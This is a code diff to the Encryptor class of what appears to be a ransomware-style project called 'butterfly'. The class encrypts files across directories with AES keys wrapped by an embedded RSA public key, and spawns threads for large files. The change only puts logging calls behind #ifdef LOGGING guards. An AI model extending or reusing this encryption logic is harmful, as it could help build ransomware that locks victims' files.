@@ -12,7 +12,9 @@ Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
                                     _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                     _aesEncryptor(new aes::AESEncryptor())
 {
+    #ifdef LOGGING
     LOG_TRACE("Create class Encryptor");
+    #endif
 }
 
 void Encryptor::validateAESKeyLength()
@@ -30,7 +32,9 @@ void Encryptor::validateAESKeyLength()
         aeskey = _aesEncryptor->getAESKey();
         aesiv = _aesEncryptor->getAESIv();
         aeskeypair = _aesEncryptor->getAESKeyPair();
+        #ifdef LOGGING
         LOG_TRACE("Generated AESKey: " << aeskey << " with Length: " << aeskey.length() << " and AESIV: " <<  aesiv << " with Length: " << aesiv.length() << " and AESKeyPairLength: " << aeskeypair.length());
+        #endif
         _aesKeyInit = true;
 
     }
@@ -43,7 +47,9 @@ void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
     // 32 Bytes AESKey + 16 Bytes IV
     if ( !butterfly::writeBinFile(butterfly::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
     {
+        #ifdef LOGGING
         LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
+        #endif
         std::cerr << "Could not save the unencrypted AESKeyPair File to Filesystem!" << std::endl;
     }
 
@@ -83,7 +89,9 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
             // Compare file size with the MAX FILE SIZE
             if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE )
             {
+                #ifdef LOGGING
                 LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
+                #endif
                 spawnThread(file.string());
             } else
             {
